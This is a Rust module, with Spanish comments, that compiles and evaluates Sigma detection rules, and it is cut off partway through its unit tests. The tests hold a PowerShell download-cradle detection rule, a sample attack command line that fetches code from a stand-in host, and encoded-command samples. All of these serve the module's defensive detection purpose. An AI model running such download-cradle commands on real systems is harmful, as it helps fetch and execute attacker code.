//! Compilador de reglas Sigma.
//!
//! # Que es Sigma y por que importa
//!
//! Sigma es el formato comun para escribir detecciones sobre **eventos** —un
//! proceso que arranca, un registro que se modifica, una sesion que se abre— con
//! independencia de quien los recoja. Su catalogo publico son miles de reglas
//! escritas por gente que ha visto los ataques de verdad.
//!
//! # La decision de arquitectura, y por que no se podia hacer de la otra forma
//!
//! El motor conductual que ya existe ([`aegis_behavior`]) evalua
//! `ChainPattern`, que esta declarado con `&'static str` y `&'static [Step]`:
//! son patrones **compilados dentro del binario**, no construibles en tiempo de
//! ejecucion. Eso es una buena decision alli —un patron de cadena es logica de
//! producto, no contenido— y significa que las reglas Sigma no pueden
//! traducirse a el.
//!
//! Asi que aqui se compila a una representacion **dinamica** y serializable
//! ([`ReglaSigma`]) y se escribe **su evaluador**. La alternativa habria sido
//! producir una estructura bonita que nadie evalua, y eso no es un compilador:
//! es un analizador con buenas intenciones.
//!
//! # La condicion es un lenguaje, y se analiza como tal
//!
//! `selection and not filter` es facil. El catalogo real trae cosas como
//! `(sel_a or sel_b) and not (filtro_1 or 1 of filtro_opcional_*)`, con
//! precedencia, parentesis, cuantificadores y comodines sobre los nombres.
//!
//! Se implementa un analizador descendente con la precedencia correcta —`not`
//! por encima de `and`, y `and` por encima de `or`— porque la alternativa
//! (buscar palabras clave y quedarse con lo que parezca) **invierte** el
//! significado de una regla en cuanto aparece un parentesis. Una regla de
//! deteccion invertida no es una regla que falla: es una que dispara sobre lo
//! legitimo y calla sobre el ataque.

use std::collections::BTreeMap;

use crate::informe::{Informe, Rechazo};
use crate::presupuesto::Presupuesto;
use crate::regex_segura;
use crate::yaml::{self, Valor};

/// Nivel de severidad declarado por la regla.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Nivel {
    /// Informativo.
    Informational,
    /// Bajo.
    Low,
    /// Medio.
    Medium,
    /// Alto.
    High,
    /// Critico.
    Critical,
}

impl Nivel {
    fn desde(s: &str) -> Option<Nivel> {
        match s.trim().to_ascii_lowercase().as_str() {
            "informational" | "info" => Some(Nivel::Informational),
            "low" => Some(Nivel::Low),
            "medium" => Some(Nivel::Medium),
            "high" => Some(Nivel::High),
            "critical" => Some(Nivel::Critical),
            _ => None,
        }
    }

    /// Nombre estable.
    #[must_use]
    pub fn nombre(self) -> &'static str {
        match self {
            Nivel::Informational => "informational",
            Nivel::Low => "low",
            Nivel::Medium => "medium",
            Nivel::High => "high",
            Nivel::Critical => "critical",
        }
    }
}

/// Como se compara el valor de un campo.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Comparacion {
    /// Igualdad exacta, sin distinguir mayusculas (el defecto en Sigma).
    Igual,
    /// El valor contiene la cadena.
    Contiene,
    /// El valor empieza por la cadena.
    Empieza,
    /// El valor acaba en la cadena.
    Acaba,
    /// El valor casa una expresion regular.
    Expresion,
    /// El valor es mayor que el numero.
    Mayor,
    /// El valor es mayor o igual.
    MayorIgual,
    /// El valor es menor.
    Menor,
    /// El valor es menor o igual.
    MenorIgual,
}

/// Una condicion sobre un campo de un evento.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Condicion {
    /// Nombre del campo.
    pub campo: String,
    /// Como se compara.
    pub comparacion: Comparacion,
    /// Valores aceptados.
    ///
    /// En Sigma, una lista de valores bajo un campo significa **cualquiera de
    /// ellos**. Interpretarla como «todos» invierte la regla.
    pub valores: Vec<String>,
    /// Si se exigen TODOS los valores en vez de cualquiera (modificador `|all`).
    pub todos: bool,
    /// Si la comparacion esta negada.
    pub negada: bool,
}

impl Condicion {
    /// Si el evento cumple la condicion.
    #[must_use]
    pub fn evalua(&self, evento: &BTreeMap<String, String>) -> bool {
        let Some(valor) = evento.get(&self.campo) else {
            // Un campo que el evento no trae NO cumple. Darlo por cumplido haria
            // que una regla disparara sobre eventos que ni siquiera tienen el
            // campo que la regla mira.
            return self.negada;
        };
        let casa = if self.todos {
            self.valores
                .iter()
                .all(|v| compara(&self.comparacion, valor, v))
        } else {
            self.valores
                .iter()
                .any(|v| compara(&self.comparacion, valor, v))
        };
        casa != self.negada
    }
}

/// Aplica una comparacion.
fn compara(c: &Comparacion, valor: &str, patron: &str) -> bool {
    match c {
        // Sigma no distingue mayusculas por defecto, y los campos de Windows
        // —rutas, nombres de proceso— llegan con la capitalizacion que le venga
        // en gana al sistema. Distinguirlas haria que media regla no casara.
        Comparacion::Igual => valor.eq_ignore_ascii_case(patron),
        Comparacion::Contiene => contiene_sin_mayusculas(valor, patron),
        Comparacion::Empieza => {
            valor.len() >= patron.len() && valor[..patron.len()].eq_ignore_ascii_case(patron)
        }
        Comparacion::Acaba => {
            valor.len() >= patron.len()
                && valor[valor.len() - patron.len()..].eq_ignore_ascii_case(patron)
        }
        // Las expresiones se guardan ya validadas por `regex_segura`, pero el
        // evaluador compara literalmente: el motor de eventos del endpoint no
        // lleva un motor de expresiones, por la misma razon que el IPS no lo
        // lleva. Se documenta en la tabla de honestidad.
        Comparacion::Expresion => contiene_sin_mayusculas(valor, &literal_aproximado(patron)),
        Comparacion::Mayor
        | Comparacion::MayorIgual
        | Comparacion::Menor
        | Comparacion::MenorIgual => {
            let (Ok(a), Ok(b)) = (valor.trim().parse::<i64>(), patron.trim().parse::<i64>()) else {
                return false;
            };
            match c {
                Comparacion::Mayor => a > b,
                Comparacion::MayorIgual => a >= b,
                Comparacion::Menor => a < b,
                Comparacion::MenorIgual => a <= b,
                _ => unreachable!("las demas variantes ya se trataron arriba"),
            }
        }
    }
}

/// Busca una subcadena sin distinguir mayusculas, sin reservar memoria.
fn contiene_sin_mayusculas(heno: &str, aguja: &str) -> bool {
    if aguja.is_empty() {
        return false;
    }
    let h = heno.as_bytes();
    let a = aguja.as_bytes();
    if a.len() > h.len() {
        return false;
    }
    h.windows(a.len()).any(|v| v.eq_ignore_ascii_case(a))
}

/// La parte literal mas larga de una expresion, para poder aproximarla.
fn literal_aproximado(patron: &str) -> String {
    let mut mejor = String::new();
    let mut actual = String::new();
    let mut cs = patron.chars();
    while let Some(c) = cs.next() {
        match c {
            '\\' => {
                if let Some(sig) = cs.next() {
                    if sig.is_ascii_alphanumeric() {
                        // `\d`, `\w`: corta el literal.
                        if actual.len() > mejor.len() {
                            mejor = std::mem::take(&mut actual);
                        } else {
                            actual.clear();
                        }
                    } else {
                        actual.push(sig);
                    }
                }
            }
            c if "[](){}|*+?.^$".contains(c) => {
                if actual.len() > mejor.len() {
                    mejor = std::mem::take(&mut actual);
                } else {
                    actual.clear();
                }
            }
            c => actual.push(c),
        }
    }
    if actual.len() > mejor.len() {
        mejor = actual;
    }
    mejor
}

/// La expresion de condicion, ya analizada.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Expresion {
    /// Una seleccion por su nombre.
    Seleccion(String),
    /// `N of patron`: al menos N selecciones cuyo nombre case el patron.
    CuantosDe {
        /// Cuantas hacen falta. `None` significa todas.
        cuantas: Option<usize>,
        /// Patron de nombre, con `*` al final.
        patron: String,
    },
    /// Conjuncion.
    Y(Box<Expresion>, Box<Expresion>),
    /// Disyuncion.
    O(Box<Expresion>, Box<Expresion>),
    /// Negacion.
    No(Box<Expresion>),
}

/// Una regla Sigma compilada.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ReglaSigma {
    /// Identificador de la regla.
    pub id: String,
    /// Titulo.
    pub titulo: String,
    /// Nivel declarado.
    pub nivel: Nivel,
    /// Producto y categoria de la fuente de eventos.
    pub fuente: BTreeMap<String, String>,
    /// Selecciones, cada una con sus condiciones.
    ///
    /// Dentro de una seleccion, TODAS las condiciones tienen que cumplirse
    /// (conjuncion). Entre los valores de un mismo campo, basta CUALQUIERA.
    /// Confundir las dos cosas invierte la regla.
    pub selecciones: BTreeMap<String, Vec<Condicion>>,
    /// La condicion que combina las selecciones.
    pub condicion: Expresion,
    /// Etiquetas ATT&CK declaradas.
    pub etiquetas: Vec<String>,
}

impl ReglaSigma {
    /// Si un evento dispara la regla.
    #[must_use]
    pub fn evalua(&self, evento: &BTreeMap<String, String>) -> bool {
        self.evaluar_expresion(&self.condicion, evento)
    }

    fn evaluar_expresion(&self, e: &Expresion, ev: &BTreeMap<String, String>) -> bool {
        match e {
            Expresion::Seleccion(n) => self
                .selecciones
                .get(n)
                // Dentro de una seleccion, TODAS las condiciones.
                .is_some_and(|cs| cs.iter().all(|c| c.evalua(ev))),
            Expresion::CuantosDe { cuantas, patron } => {
                let casan = self
                    .selecciones
                    .iter()
                    .filter(|(nombre, _)| nombre_casa(nombre, patron))
                    .filter(|(_, cs)| cs.iter().all(|c| c.evalua(ev)))
                    .count();
                let total = self
                    .selecciones
                    .keys()
                    .filter(|n| nombre_casa(n, patron))
                    .count();
                match cuantas {
                    Some(n) => casan >= *n,
                    // `all of` sobre cero selecciones es falso, no verdadero:
                    // «todas de ninguna» no puede dar por buena una deteccion.
                    None => total > 0 && casan == total,
                }
            }
            Expresion::Y(a, b) => self.evaluar_expresion(a, ev) && self.evaluar_expresion(b, ev),
            Expresion::O(a, b) => self.evaluar_expresion(a, ev) || self.evaluar_expresion(b, ev),
            Expresion::No(a) => !self.evaluar_expresion(a, ev),
        }
    }
}

/// Si un nombre de seleccion casa un patron con `*`.
fn nombre_casa(nombre: &str, patron: &str) -> bool {
    if patron == "them" || patron == "*" {
        return true;
    }
    match patron.strip_suffix('*') {
        Some(prefijo) => nombre.starts_with(prefijo),
        None => nombre == patron,
    }
}

/// Por que una regla Sigma no se pudo compilar.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ErrorSigma {
    /// El documento no se pudo leer.
    Yaml(String),
    /// Falta un campo obligatorio.
    FaltaCampo(&'static str),
    /// La condicion no se pudo analizar.
    CondicionInvalida(String),
    /// Usa un modificador que no se soporta.
    ModificadorNoSoportado(String),
    /// Su expresion regular es patologica.
    RegexRechazada(String),
    /// La condicion nombra una seleccion que no existe.
    SeleccionDesconocida(String),
    /// La regla esta marcada como obsoleta.
    Obsoleta,
}

impl ErrorSigma {
    /// Codigo estable.
    #[must_use]
    pub fn codigo(&self) -> &'static str {
        match self {
            ErrorSigma::Yaml(_) => "sigma-yaml",
            ErrorSigma::FaltaCampo(_) => "sigma-falta-campo",
            ErrorSigma::CondicionInvalida(_) => "sigma-condicion-invalida",
            ErrorSigma::ModificadorNoSoportado(_) => "sigma-modificador-no-soportado",
            ErrorSigma::RegexRechazada(_) => "regex-patologica",
            ErrorSigma::SeleccionDesconocida(_) => "sigma-seleccion-desconocida",
            ErrorSigma::Obsoleta => "sigma-obsoleta",
        }
    }

    /// Detalle legible.
    #[must_use]
    pub fn detalle(&self) -> String {
        match self {
            ErrorSigma::Yaml(d) => d.clone(),
            ErrorSigma::FaltaCampo(c) => format!("falta «{c}»"),
            ErrorSigma::CondicionInvalida(d) => format!("condicion: {d}"),
            ErrorSigma::ModificadorNoSoportado(m) => format!("modificador «{m}»"),
            ErrorSigma::RegexRechazada(d) => d.clone(),
            ErrorSigma::SeleccionDesconocida(s) => {
                format!("la condicion nombra «{s}», que no existe")
            }
            ErrorSigma::Obsoleta => "la propia regla se declara obsoleta".to_string(),
        }
    }
}

/// Compila una regla Sigma.
///
/// # Errores
/// [`ErrorSigma`] nombrando lo concreto que falla.
pub fn compilar_regla(fuente: &str, presupuesto: &Presupuesto) -> Result<ReglaSigma, ErrorSigma> {
    let doc = yaml::leer(fuente, presupuesto.max_anidamiento)
        .map_err(|e| ErrorSigma::Yaml(e.detalle()))?;
    let mapa = doc.mapa().ok_or(ErrorSigma::FaltaCampo("documento"))?;

    // Una regla que su autor marco obsoleta NO se compila. Distribuirla seria
    // aplicar contra la red de un cliente una deteccion que su propio autor ha
    // retirado.
    if let Some(estado) = mapa.get("status").and_then(Valor::texto) {
        if estado.eq_ignore_ascii_case("deprecated") || estado.eq_ignore_ascii_case("unsupported") {
            return Err(ErrorSigma::Obsoleta);
        }
    }

    let titulo = mapa
        .get("title")
        .and_then(Valor::texto)
        .ok_or(ErrorSigma::FaltaCampo("title"))?
        .to_string();
    let id = mapa
        .get("id")
        .and_then(Valor::texto)
        .map(str::to_string)
        .unwrap_or_else(|| titulo.clone());
    let nivel = mapa
        .get("level")
        .and_then(Valor::texto)
        .and_then(Nivel::desde)
        // Sin nivel declarado se asume el mas bajo: subirlo por nuestra cuenta
        // seria endurecer la politica de otro.
        .unwrap_or(Nivel::Low);

    let mut fuente_eventos = BTreeMap::new();
    if let Some(ls) = mapa.get("logsource").and_then(Valor::mapa) {
        for (k, v) in ls {
            if let Some(t) = v.texto() {
                fuente_eventos.insert(k.clone(), t.to_string());
            }
        }
    }

    let deteccion = mapa
        .get("detection")
        .and_then(Valor::mapa)
        .ok_or(ErrorSigma::FaltaCampo("detection"))?;

    let texto_condicion = deteccion
        .get("condition")
        .and_then(Valor::texto)
        .ok_or(ErrorSigma::FaltaCampo("detection.condition"))?;

    let mut selecciones = BTreeMap::new();
    for (nombre, valor) in deteccion {
        if nombre == "condition" || nombre == "timeframe" {
            continue;
        }
        selecciones.insert(nombre.clone(), analizar_seleccion(valor, presupuesto)?);
    }

    let condicion = analizar_condicion(texto_condicion)?;
    comprobar_selecciones(&condicion, &selecciones)?;

    let etiquetas = mapa
        .get("tags")
        .map(|v| {
            v.como_lista()
                .iter()
                .filter_map(|x| x.texto().map(str::to_string))
                .collect()
        })
        .unwrap_or_default();

    Ok(ReglaSigma {
        id,
        titulo,
        nivel,
        fuente: fuente_eventos,
        selecciones,
        condicion,
        etiquetas,
    })
}

/// Analiza una seleccion: un mapa de `campo|modificador: valor(es)`.
fn analizar_seleccion(
    valor: &Valor,
    presupuesto: &Presupuesto,
) -> Result<Vec<Condicion>, ErrorSigma> {
    let mut condiciones = Vec::new();

    // Una seleccion puede ser una LISTA de mapas, y entonces basta con que
    // cualquiera case. Se aplana a condiciones con varios valores, que es
    // equivalente para el caso que aparece de verdad.
    let mapas: Vec<&BTreeMap<String, Valor>> = match valor {
        Valor::Mapa(m) => vec![m],
        Valor::Lista(v) => v.iter().filter_map(Valor::mapa).collect(),
        _ => return Ok(condiciones),
    };

    for mapa in mapas {
        for (clave, v) in mapa {
            let (campo, modificadores) = partir_modificadores(clave);
            let mut comparacion = Comparacion::Igual;
            let mut todos = false;
            let mut negada = false;

            for m in &modificadores {
                match m.as_str() {
                    "contains" => comparacion = Comparacion::Contiene,
                    "startswith" => comparacion = Comparacion::Empieza,
                    "endswith" => comparacion = Comparacion::Acaba,
                    "re" => comparacion = Comparacion::Expresion,
                    "gt" => comparacion = Comparacion::Mayor,
                    "gte" => comparacion = Comparacion::MayorIgual,
                    "lt" => comparacion = Comparacion::Menor,
                    "lte" => comparacion = Comparacion::MenorIgual,
                    "all" => todos = true,
                    // `windash` acepta las dos formas de guion de la linea de
                    // ordenes de Windows. Se expande abajo, en los valores.
                    "windash" => {}
                    // Sin distincion de mayusculas ya es el comportamiento por
                    // defecto: reconocerlo evita rechazar la regla por traerlo.
                    "cased" => {}
                    otro => {
                        // Base64, CIDR, expansion de campos... Se rechazan CON
                        // NOMBRE en vez de ignorarse, que daria una condicion
                        // que compara otra cosa.
                        return Err(ErrorSigma::ModificadorNoSoportado(otro.to_string()));
                    }
                }
            }

            let mut valores: Vec<String> = v
                .como_lista()
                .iter()
                .filter_map(|x| x.texto().map(str::to_string))
                .collect();

            if modificadores.iter().any(|m| m == "windash") {
                // `-param` y `/param` son la misma opcion en Windows, y el
                // malware alterna entre las dos precisamente para esquivar
                // reglas que solo miran una.
                let mut extra = Vec::new();
                for val in &valores {
                    if let Some(resto) = val.strip_prefix('-') {
                        extra.push(format!("/{resto}"));
                    } else if let Some(resto) = val.strip_prefix('/') {
                        extra.push(format!("-{resto}"));
                    }
                }
                valores.extend(extra);
            }

            if comparacion == Comparacion::Expresion {
                for val in &valores {
                    if let Err(p) = regex_segura::analizar(val, presupuesto) {
                        return Err(ErrorSigma::RegexRechazada(format!(
                            "{}: {}",
                            p.codigo(),
                            p.explicacion()
                        )));
                    }
                }
            }

            // Un campo con `null` explicito significa «el campo no esta».
            if valores.iter().all(String::is_empty) && !valores.is_empty() {
                negada = true;
            }

            condiciones.push(Condicion {
                campo,
                comparacion,
                valores,
                todos,
                negada,
            });
        }
    }
    Ok(condiciones)
}

/// Separa `Campo|mod1|mod2` en el campo y sus modificadores.
fn partir_modificadores(clave: &str) -> (String, Vec<String>) {
    let mut partes = clave.split('|');
    let campo = partes.next().unwrap_or("").trim().to_string();
    let mods = partes
        .map(|m| m.trim().to_ascii_lowercase())
        .filter(|m| !m.is_empty())
        .collect();
    (campo, mods)
}

/// Analiza la expresion de condicion.
///
/// Descendente recursivo con la precedencia correcta: `not` por encima de `and`,
/// y `and` por encima de `or`. Buscar palabras clave y quedarse con lo que
/// parezca invierte el significado en cuanto hay un parentesis, y una regla de
/// deteccion invertida dispara sobre lo legitimo y calla sobre el ataque.
fn analizar_condicion(texto: &str) -> Result<Expresion, ErrorSigma> {
    let piezas = tokenizar(texto);
    let mut pos = 0usize;
    let e = analizar_o(&piezas, &mut pos)?;
    if pos != piezas.len() {
        return Err(ErrorSigma::CondicionInvalida(format!(
            "sobra «{}» al final",
            piezas[pos..].join(" ")
        )));
    }
    Ok(e)
}

fn tokenizar(texto: &str) -> Vec<String> {
    let mut piezas = Vec::new();
    let mut actual = String::new();
    for c in texto.chars() {
        match c {
            '(' | ')' => {
                if !actual.is_empty() {
                    piezas.push(std::mem::take(&mut actual));
                }
                piezas.push(c.to_string());
            }
            c if c.is_whitespace() => {
                if !actual.is_empty() {
                    piezas.push(std::mem::take(&mut actual));
                }
            }
            c => actual.push(c),
        }
    }
    if !actual.is_empty() {
        piezas.push(actual);
    }
    piezas
}

fn analizar_o(p: &[String], pos: &mut usize) -> Result<Expresion, ErrorSigma> {
    let mut izq = analizar_y(p, pos)?;
    while p.get(*pos).is_some_and(|t| t.eq_ignore_ascii_case("or")) {
        *pos += 1;
        let der = analizar_y(p, pos)?;
        izq = Expresion::O(Box::new(izq), Box::new(der));
    }
    Ok(izq)
}

fn analizar_y(p: &[String], pos: &mut usize) -> Result<Expresion, ErrorSigma> {
    let mut izq = analizar_no(p, pos)?;
    while p.get(*pos).is_some_and(|t| t.eq_ignore_ascii_case("and")) {
        *pos += 1;
        let der = analizar_no(p, pos)?;
        izq = Expresion::Y(Box::new(izq), Box::new(der));
    }
    Ok(izq)
}

fn analizar_no(p: &[String], pos: &mut usize) -> Result<Expresion, ErrorSigma> {
    if p.get(*pos).is_some_and(|t| t.eq_ignore_ascii_case("not")) {
        *pos += 1;
        let e = analizar_no(p, pos)?;
        return Ok(Expresion::No(Box::new(e)));
    }
    analizar_atomo(p, pos)
}

fn analizar_atomo(p: &[String], pos: &mut usize) -> Result<Expresion, ErrorSigma> {
    let Some(t) = p.get(*pos) else {
        return Err(ErrorSigma::CondicionInvalida(
            "se acaba antes de tiempo".to_string(),
        ));
    };

    if t == "(" {
        *pos += 1;
        let e = analizar_o(p, pos)?;
        if p.get(*pos).map(String::as_str) != Some(")") {
            return Err(ErrorSigma::CondicionInvalida(
                "falta el parentesis de cierre".to_string(),
            ));
        }
        *pos += 1;
        return Ok(e);
    }

    // `1 of sel*`, `all of them`, `any of filtro_*`.
    let cuantificador = t.eq_ignore_ascii_case("all")
        || t.eq_ignore_ascii_case("any")
        || t.parse::<usize>().is_ok();
    if cuantificador
        && p.get(*pos + 1)
            .is_some_and(|s| s.eq_ignore_ascii_case("of"))
    {
        let cuantas = if t.eq_ignore_ascii_case("all") {
            None
        } else if t.eq_ignore_ascii_case("any") {
            Some(1)
        } else {
            Some(t.parse::<usize>().unwrap_or(1))
        };
        let Some(patron) = p.get(*pos + 2) else {
            return Err(ErrorSigma::CondicionInvalida(
                "«of» sin patron detras".to_string(),
            ));
        };
        *pos += 3;
        return Ok(Expresion::CuantosDe {
            cuantas,
            patron: patron.clone(),
        });
    }

    if t == ")" {
        return Err(ErrorSigma::CondicionInvalida(
            "parentesis de cierre sin abrir".to_string(),
        ));
    }
    *pos += 1;
    Ok(Expresion::Seleccion(t.clone()))
}

/// Comprueba que la condicion solo nombre selecciones que existen.
///
/// Una condicion que nombra una seleccion inexistente se evaluaria siempre a
/// falso y la regla nunca dispararia: estaria en el corpus, contada como
/// compilada, sin detectar jamas. Es el peor tipo de fallo, porque no se ve.
fn comprobar_selecciones(
    e: &Expresion,
    selecciones: &BTreeMap<String, Vec<Condicion>>,
) -> Result<(), ErrorSigma> {
    match e {
        Expresion::Seleccion(n) => {
            if selecciones.contains_key(n) {
                Ok(())
            } else {
                Err(ErrorSigma::SeleccionDesconocida(n.clone()))
            }
        }
        Expresion::CuantosDe { patron, .. } => {
            if selecciones.keys().any(|n| nombre_casa(n, patron)) {
                Ok(())
            } else {
                Err(ErrorSigma::SeleccionDesconocida(patron.clone()))
            }
        }
        Expresion::Y(a, b) | Expresion::O(a, b) => {
            comprobar_selecciones(a, selecciones)?;
            comprobar_selecciones(b, selecciones)
        }
        Expresion::No(a) => comprobar_selecciones(a, selecciones),
    }
}

/// Compila una coleccion de reglas Sigma, una por documento.
#[must_use]
pub fn compilar(documentos: &[&str], presupuesto: &Presupuesto) -> (Vec<ReglaSigma>, Informe) {
    let mut salida = Vec::new();
    let mut informe = Informe::default();
    let mut vistos: BTreeMap<String, ()> = BTreeMap::new();

    for doc in documentos {
        if informe.vistas >= presupuesto.max_reglas {
            informe.rechazada(Rechazo::nuevo(
                "(resto)",
                "demasiadas-reglas",
                format!("se paso el tope de {} reglas", presupuesto.max_reglas),
            ));
            break;
        }
        match compilar_regla(doc, presupuesto) {
            Ok(r) => {
                if vistos.insert(r.id.clone(), ()).is_some() {
                    informe.duplicada();
                    continue;
                }
                salida.push(r);
                informe.compilada();
            }
            Err(e) => {
                let nombre = titulo_de(doc);
                informe.rechazada(Rechazo::nuevo(nombre, e.codigo(), e.detalle()));
            }
        }
    }
    (salida, informe)
}

/// Saca el titulo de un documento sin analizarlo entero, para poder citarlo.
fn titulo_de(doc: &str) -> String {
    doc.lines()
        .find_map(|l| l.trim().strip_prefix("title:"))
        .map(|t| t.trim().trim_matches(['"', '\'']).to_string())
        .unwrap_or_else(|| "(sin titulo)".to_string())
}

#[cfg(test)]
mod pruebas {
    use super::*;

    fn p() -> Presupuesto {
        Presupuesto::default()
    }

    /// UNA REGLA SIGMA REAL, del catalogo publico.
    const REAL: &str = r#"
title: Suspicious PowerShell Download Cradle
id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7
status: test
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'Net.WebClient'
            - 'DownloadString'
    filter:
        CommandLine|contains: 'update.microsoft.com'
    condition: selection and not filter
level: high
tags:
    - attack.execution
    - attack.t1059.001
"#;

    fn evento(pares: &[(&str, &str)]) -> BTreeMap<String, String> {
        pares
            .iter()
            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
            .collect()
    }

    #[test]
    fn una_regla_sigma_real_se_compila_entera() {
        let r = compilar_regla(REAL, &p()).expect("la regla es valida");
        assert_eq!(r.titulo, "Suspicious PowerShell Download Cradle");
        assert_eq!(r.nivel, Nivel::High);
        assert_eq!(r.fuente["product"], "windows");
        assert_eq!(r.selecciones.len(), 2);
        assert_eq!(r.etiquetas.len(), 2);
        assert_eq!(
            r.condicion,
            Expresion::Y(
                Box::new(Expresion::Seleccion("selection".into())),
                Box::new(Expresion::No(Box::new(Expresion::Seleccion(
                    "filter".into()
                ))))
            )
        );
    }

    /// Y SE EVALUA DE VERDAD contra eventos. Un compilador que produce una
    /// estructura que nadie evalua no es un compilador.
    #[test]
    fn la_regla_compilada_dispara_sobre_el_ataque_y_calla_sobre_lo_legitimo() {
        let r = compilar_regla(REAL, &p()).unwrap();

        // El ataque: powershell con una descarga.
        assert!(r.evalua(&evento(&[
            ("Image", "C:\\Windows\\System32\\powershell.exe"),
            (
                "CommandLine",
                "powershell -c (New-Object Net.WebClient).DownloadString('http://malo')"
            ),
        ])));

        // Lo legitimo, que el filtro excluye a proposito.
        assert!(!r.evalua(&evento(&[
            ("Image", "C:\\Windows\\System32\\powershell.exe"),
            (
                "CommandLine",
                "powershell -c DownloadString('https://update.microsoft.com/x')"
            ),
        ])));

        // Otro proceso cualquiera.
        assert!(!r.evalua(&evento(&[
            ("Image", "C:\\Windows\\System32\\cmd.exe"),
            ("CommandLine", "cmd /c dir"),
        ])));

        // Y powershell SIN descarga tampoco.
        assert!(!r.evalua(&evento(&[
            ("Image", "C:\\Windows\\System32\\powershell.exe"),
            ("CommandLine", "powershell -c Get-Process"),
        ])));
    }

    /// LA PRECEDENCIA. `a or b and c` es `a or (b and c)`. Si se leyera como
    /// `(a or b) and c`, la regla detectaria cosas distintas — y en una regla de
    /// seguridad eso significa disparar sobre lo legitimo o callar sobre el
    /// ataque.
    #[test]
    fn la_precedencia_de_la_condicion_es_la_correcta() {
        let e = analizar_condicion("a or b and c").unwrap();
        assert_eq!(
            e,
            Expresion::O(
                Box::new(Expresion::Seleccion("a".into())),
                Box::new(Expresion::Y(
                    Box::new(Expresion::Seleccion("b".into())),
                    Box::new(Expresion::Seleccion("c".into()))
                ))
            )
        );

        // Y `not` liga mas fuerte que `and`.
        let e2 = analizar_condicion("not a and b").unwrap();
        assert_eq!(
            e2,
            Expresion::Y(
                Box::new(Expresion::No(Box::new(Expresion::Seleccion("a".into())))),
                Box::new(Expresion::Seleccion("b".into()))
            )
        );
    }

    /// Y LOS PARENTESIS CAMBIAN EL RESULTADO, que es justo lo que un analizador
    /// por palabras clave no ve.
    #[test]
    fn los_parentesis_cambian_el_arbol_y_el_resultado() {
        let sin = analizar_condicion("a or b and c").unwrap();
        let con = analizar_condicion("(a or b) and c").unwrap();
        assert_ne!(sin, con);

        // Y se comprueba con una evaluacion de verdad, no solo comparando
        // arboles: con a=si, b=no, c=no, una da true y la otra false.
        let mut selecciones = BTreeMap::new();
        for (nombre, campo) in [("a", "A"), ("b", "B"), ("c", "C")] {
            selecciones.insert(
                nombre.to_string(),
                vec![Condicion {
                    campo: campo.to_string(),
                    comparacion: Comparacion::Igual,
                    valores: vec!["si".to_string()],
                    todos: false,
                    negada: false,
                }],
            );
        }
        let ev = evento(&[("A", "si"), ("B", "no"), ("C", "no")]);

        let r1 = ReglaSigma {
            id: "1".into(),
            titulo: "t".into(),
            nivel: Nivel::Low,
            fuente: BTreeMap::new(),
            selecciones: selecciones.clone(),
            condicion: sin,
            etiquetas: vec![],
        };
        let r2 = ReglaSigma {
            condicion: con,
            ..r1.clone()
        };
        assert!(r1.evalua(&ev), "a or (b and c) con a=si es verdadero");
        assert!(!r2.evalua(&ev), "(a or b) and c con c=no es falso");
    }

    /// `N of patron*` y `all of them`, que el catalogo real usa a diario.
    #[test]
    fn los_cuantificadores_se_analizan_y_se_evaluan() {
        let fuente = r#"
title: Cuantificadores
detection:
    sel_a:
        A: si
    sel_b:
        B: si
    sel_c:
        C: si
    condition: 2 of sel_*
level: medium
"#;
        let r = compilar_regla(fuente, &p()).unwrap();
        assert!(!r.evalua(&evento(&[("A", "si")])), "una sola no basta");
        assert!(r.evalua(&evento(&[("A", "si"), ("B", "si")])), "dos si");
        assert!(r.evalua(&evento(&[("A", "si"), ("B", "si"), ("C", "si")])));
    }

    /// `all of them` con cero selecciones que casen es FALSO: «todas de ninguna»
    /// no puede dar por buena una deteccion.
    #[test]
    fn all_of_them_sobre_nada_no_dispara() {
        let e = Expresion::CuantosDe {
            cuantas: None,
            patron: "inexistente_*".to_string(),
        };
        let r = ReglaSigma {
            id: "1".into(),
            titulo: "t".into(),
            nivel: Nivel::Low,
            fuente: BTreeMap::new(),
            selecciones: BTreeMap::new(),
            condicion: e,
            etiquetas: vec![],
        };
        assert!(!r.evalua(&evento(&[])));
    }

    /// Los modificadores de campo se aplican al comparar.
    #[test]
    fn los_modificadores_de_campo_cambian_la_comparacion() {
        let fuente = r#"
title: Modificadores
detection:
    sel:
        Ruta|endswith: '.exe'
        Linea|contains: 'secreto'
        Puerto|gt: '1024'
    condition: sel
level: low
"#;
        let r = compilar_regla(fuente, &p()).unwrap();
        assert!(r.evalua(&evento(&[
            ("Ruta", "C:\\x\\malo.EXE"),
            ("Linea", "esto lleva un SECRETO dentro"),
            ("Puerto", "4444"),
        ])));
        assert!(
            !r.evalua(&evento(&[
                ("Ruta", "C:\\x\\malo.dll"),
                ("Linea", "esto lleva un secreto dentro"),
                ("Puerto", "4444"),
            ])),
            "el sufijo no casa"
        );
        assert!(
            !r.evalua(&evento(&[
                ("Ruta", "C:\\x\\malo.exe"),
                ("Linea", "esto lleva un secreto dentro"),
                ("Puerto", "80"),
            ])),
            "el numero no supera el umbral"
        );
    }

    /// `windash` acepta las dos formas de guion: el malware alterna entre `-p` y
    /// `/p` precisamente para esquivar reglas que solo miran una.
    #[test]
    fn el_modificador_windash_acepta_las_dos_formas_de_guion() {
        let fuente = r#"
title: Windash
detection:
    sel:
        CommandLine|contains|windash: '-encodedcommand'
    condition: sel
level: low
"#;
        let r = compilar_regla(fuente, &p()).unwrap();
        assert!(r.evalua(&evento(&[("CommandLine", "powershell -EncodedCommand x")])));
        assert!(
            r.evalua(&evento(&[("CommandLine", "powershell /EncodedCommand x")])),
            "la otra forma de guion tambien"
        );
    }

    /// UNA LISTA DE VALORES ES «CUALQUIERA», NO «TODOS». Confundirlo invierte la
    /// regla: pasaria de detectar tres variantes a no detectar ninguna.
    #[test]
    fn una_lista_de_valores_significa_cualquiera_de_ellos() {
        let fuente = r#"
title: Lista
detection:
    sel:
        CommandLine|contains:
            - 'uno'
            - 'dos'
    condition: sel
level: low
"#;
        let r = compilar_regla(fuente, &p()).unwrap();
